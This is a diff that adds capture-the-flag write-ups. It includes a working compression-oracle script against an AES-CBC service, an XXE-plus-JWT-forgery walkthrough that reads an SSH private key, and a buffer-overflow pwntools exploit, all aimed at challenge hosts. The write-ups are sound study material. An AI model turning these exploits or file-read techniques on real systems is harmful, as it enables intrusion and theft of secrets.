@@ -29,8 +29,107 @@ Babby tier.
 
 ## CRYPTO
 ### Wifi Password of The Day (200p, Fel)
-...
+This was my favorite challenge of the CTF by far. We are provided with a python script named `wifi.py` which spins up a TCP server. Connecting to it, we are asked to provide a username, which is added to a JSON object which is then compressed using zlib and encrypted using AES-CBC. This compressed string is then returned to the user.
 
+![](https://i.imgur.com/kF5ybAx.png)
+
+Compressing the JSON makes this encryption vulnerable to a compression oracle attack. We can guess the flag byte by byte, as the flag is already in the data that is being compressed if our guess is correct then the compression algorithm will remove this redundant data and we will not see an increase in length, otherwise the length will increase.
+
+I wouldn't have been able to complete this challenge without the help of a brilliant writeup by [f0rki](https://hack.more.systems/writeup/2015/10/06/tumctfteaser2015-turbo/). I used basically a slightly modified version of the code in the writeup linked to acquire the flag.
+
+```python
+from pwn import *
+import json
+import collections
+import struct
+import string
+import random
+
+#https://hack.more.systems/writeup/2015/10/06/tumctfteaser2015-turbo/
+
+context.log_level = "WARNING"
+
+iv = 16 * b'\x00'
+
+first = b'{"user": "000000' #first 16 bytes (with 0*6)
+second = b'0'*16 #xd
+
+candidates = 'abcdefghijklmnopqrstuvwxyz_'
+
+def main(input):
+	r = remote('0.cloud.chals.io',28931)
+	#r = remote('localhost', 1234)
+
+
+	r.sendlineafter(b'\n',input)
+
+	out = r.recvline(timeout=5)
+
+	ct = out[16:-2]
+
+	return base64.b64decode(ct).hex()
+
+printables = string.digits + "_" + string.ascii_letters + '@#-[]+='
+printables = printables[::-1]
+printables = ''.join(random.sample(printables, len(printables)))
+
+
+flaglen = 32
+minlen = len(main(''))
+pl = minlen
+padlen = 0
+
+for i in range(21,50):
+	log.warning("trying {} chars".format(i))
+	l = len(main(printables[:i]))
+	log.warning("got length {}".format(l))
+	if l != pl:
+		padlen = i + 1
+		break
+log.warning("deduced padding length {}".format(padlen))
+
+
+BB = padlen - 4
+previous = []
+pl = 0
+for i in range(len(previous), flaglen):
+	log.warning("guessing char number {}".format(i))
+	test = "flag{" + "".join(previous)
+	test = printables[:BB] + test 
+	log.warning("tryhing prefix: " + test)
+	pl = len(main(test))
+	log.warning("got length = {}".format(pl))
+	foundit = False
+	for c in printables + "}":
+		test = "flag{"+ "".join(previous)
+		test = printables[:BB] + test + c
+		log.warning("trying prefix: " + test)
+		l = len(main(test))
+		log.warning("l = {}, pl = {}".format(l,pl))
+		if l == pl:
+			log.warning("deduced next char: " + c)
+			previous.append(c)
+			foundit = True
+			break
+		else:
+			log.warning("guess was wrong")
+	if foundit:
+		log.warning("Current flag prefix guess is \'flag{}{}\'"
+		.format("{", "".join(previous)))
+	else:
+		log.error("couldn't guess char {}".format(i))
+	if previous[-1] == "}":
+		break
+
+flag = "flag{" + "".join(previous)
+if flag[-1] != "}":
+	flag += "}"
+log.warning("final flag should be "+ flag)
+```
+
+After running this (for a very long time) we get our flag! `flag{c0mpr3ssion_0r4cl3_FTW}`
+
+![](https://i.imgur.com/xZ0IQiG.png)
 ### Hackerized
 Babby tier.
 
@@ -61,11 +160,23 @@ Finally, we had to supply the correct variable (or "preference", as it was calle
 
 ## WEB
 ### Babby Web 1-4 (100p each, Fel)
-As the name would suggest
+Challs 1-4 were all on the same site and located in the following places:
+- The SSL Certificate
+- The HTML in plaintext
+- The headers
+- robots.txt
 
 ### ContinuuOS (100p, Fel)
-...
+Fairly simple, used a XML External Entity injection to retrieve `file:///var/www/html/conf.xml`. This tells me that password is `Continu321!`, as well as something mysteriously named `secret`.
 
+![xxe](https://i.imgur.com/6SRCKUZ.png) 
+
+After logging on we see a page that allows us to retrieve `/var/log/operations.log` and display the contents, surely we can use this to acquire the flag.
+![webpage](https://i.imgur.com/5gv0L07.png)
+
+Using ZAP I can see that pressing submit sends a JWT token, decoding it shows that I can change the file retrieved to anything. The challenge description mentions something about ssh, so I change the payload to retrieve `/home/operations/.ssh/id_rsa`, encoding it using the secret from before, and receive the flag.
+
+![flagos](https://i.imgur.com/S61CHLa.png)
 ## OSINT
 ### Find Me if You Can (100p, Charlie)
 ...
@@ -78,7 +189,27 @@ As the name would suggest
 
 ## RE
 ### Olden Ring (100p, Fel)
-...
+Upon running the script we are presented with a prompt asking for a name, upon providing a name it responds with some flavor text and asks us to input a number between `[0,250]`.
+
+![](https://i.imgur.com/hYYH8Pm.png)
+
+After playing around for a bit I noticed that the program produces a SEGFAULT error when provided a number larger than ~195. After disassembling the binary I found a function named `zip_to_end()` which returned the flag when called. To get the flag, I wrote a *very* short script to send a payload to cause a buffer overflow and return the flag.
+
+```python
+from pwn import *	
+
+r = remote('0.cloud.chals.io', 19267)
+r.recvline()
+
+r.send('A'*1006 + '\xb6\x12\x40\x00\x00\x00\x00\x00\n')
+r.recvuntil(' ', drop=True)
+r.recvline()
+r.interactive()
+```
+
+Running this, we get the flag `flag{w3ll_pwn3d_t4rn1sh3d}`
+
+![](https://i.imgur.com/5AhxfVu.png)
 
 ## STEGANOGRAPHY
 ### Characters of Shakespeare's Plays (200p, Charlie)
